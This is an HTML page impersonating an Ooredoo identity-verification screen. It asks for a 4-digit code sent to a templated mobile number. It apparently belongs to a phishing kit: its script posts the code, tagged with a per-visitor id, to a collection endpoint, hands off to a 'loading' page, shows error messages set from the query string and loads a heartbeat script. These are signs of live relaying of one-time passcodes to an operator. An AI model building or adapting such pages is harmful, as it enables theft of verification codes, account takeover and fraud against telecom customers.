<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Enter the 4-digit code</title>
<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--red:#ED1C24;--ink:#2a2a3a;--grey-text:#7c7c85;--border:#c7c7cf;--pill:#e9e9ef;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}*,*::before,*::after{box-sizing:inherit}html,body{margin:0;background:#fff}body{font-family:'IBM Plex Sans Arabic',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:var(--ink);display:flex;justify-content:center;-webkit-font-smoothing:antialiased}.screen{width:100%;max-width:380px;min-height:100vh;padding:44px 22px 30px;display:flex;flex-direction:column}h1{font-weight:700;font-size:27px;line-height:1.35;margin:0 0 24px}.intro{font-size:15px;line-height:1.8;margin:0 0 4px}.num{font-weight:600;direction:ltr;unicode-bidi:embed}.otp{margin-top:34px;display:flex;gap:14px;direction:ltr}.otp input{flex:1;aspect-ratio:1;min-width:0;border:1.5px solid var(--border);border-radius:16px;background:#fff;text-align:center;font:600 26px inherit;color:var(--ink);outline:none}.otp input:focus{border-color:var(--red)}.row{margin-top:34px;display:flex;align-items:center;justify-content:space-between}.timer{display:inline-flex;align-items:center;gap:8px;background:var(--pill);border-radius:999px;padding:8px 16px;font-weight:500;font-size:16px;direction:ltr}.spinner{width:16px;height:16px;border:2.5px solid rgba(0,0,0,.18);border-top-color:var(--red);border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.resend{color:var(--ink);font-weight:500;font-size:15px;text-decoration:underline;text-underline-offset:4px;cursor:pointer}.resend.disabled{color:var(--grey-text);pointer-events:none;text-decoration:none}.otp-error{display:none;margin:18px 0 0;color:var(--red);font-size:14px;font-weight:600;line-height:1.6;text-align:center}.otp-error.visible{display:block}.confirm{margin-top:32px;width:100%;height:52px;border:0;border-radius:12px;background:var(--red);color:#fff;font:600 16px inherit;cursor:pointer}.language{margin:20px auto 0;color:var(--red);font-size:13px;text-decoration:none}@media(max-width:360px){.otp{gap:10px}h1{font-size:24px}}
</style>
</head>
<body><main class="screen"><h1>Enter the 4-digit code</h1><p class="intro">Let’s verify your identity.</p><p class="intro">Enter the verification code sent to your mobile number <span class="num">{{MOBILE_NUMBER}}</span>.</p><div class="otp" id="otp"><input type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code"><input type="tel" inputmode="numeric" maxlength="1"><input type="tel" inputmode="numeric" maxlength="1"><input type="tel" inputmode="numeric" maxlength="1"></div><div class="row"><span class="timer"><span class="spinner"></span><span id="time">32:00</span></span><a class="resend" id="resend" href="#">Resend temporary password</a></div><p class="otp-error" id="otpError" role="alert">The code is incorrect or invalid</p><button class="confirm" type="button" onclick="handleOtp()">Confirm</button><a class="language" href="ooredoo-otp.html">العربية</a></main>
<script>
const inputs=[...document.querySelectorAll('#otp input')];inputs.forEach((inp,i)=>{inp.addEventListener('input',()=>{inp.value=inp.value.replace(/\D/g,'');if(inp.value&&i<inputs.length-1)inputs[i+1].focus();});inp.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!inp.value&&i>0)inputs[i-1].focus();});inp.addEventListener('paste',e=>{e.preventDefault();const digits=(e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,inputs.length);digits.split('').forEach((d,k)=>{if(inputs[k])inputs[k].value=d;});if(digits.length)inputs[Math.min(digits.length,inputs.length-1)].focus();});});let remaining=32*60;const timeEl=document.getElementById('time');const resend=document.getElementById('resend');const tick=()=>{const m=String(Math.floor(remaining/60)).padStart(2,'0');const s=String(remaining%60).padStart(2,'0');timeEl.textContent=m+':'+s;if(remaining<=0){clearInterval(iv);resend.classList.remove('disabled');}remaining--;};tick();const iv=setInterval(tick,1000);resend.addEventListener('click',e=>{e.preventDefault();remaining=32*60;});function handleOtp(){const error=document.getElementById('otpError');const invalid=inputs.some(input=>!/^[0-9]$/.test(input.value));error.classList.toggle('visible',invalid);if(invalid){(inputs.find(input=>!input.value)||inputs[0]).focus();return;}var id=new URLSearchParams(window.location.search).get('id')||'';if(!id){error.classList.add('visible');return;}var otp=inputs.map(function(input){return input.value;}).join('');fetch('/api/ooredoo-otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id,otp:otp})}).then(function(response){if(!response.ok)throw new Error('rejected');window.location.href='ooredoo-otp-loading-en.html?id='+encodeURIComponent(id);}).catch(function(){error.textContent='Unable to submit the code. Please try again';error.classList.add('visible');});}
</script><script>(function(){var p=new URLSearchParams(window.location.search);var err=p.get('error');if(err==='1'||err==='ooredoo_otp'){var e=document.getElementById('otpError');var msg=p.get('msg');e.textContent=msg||'The Ooredoo code was incorrect or rejected';e.classList.add('visible');}})();</script><script src="heartbeat.js"></script>
</body></html>
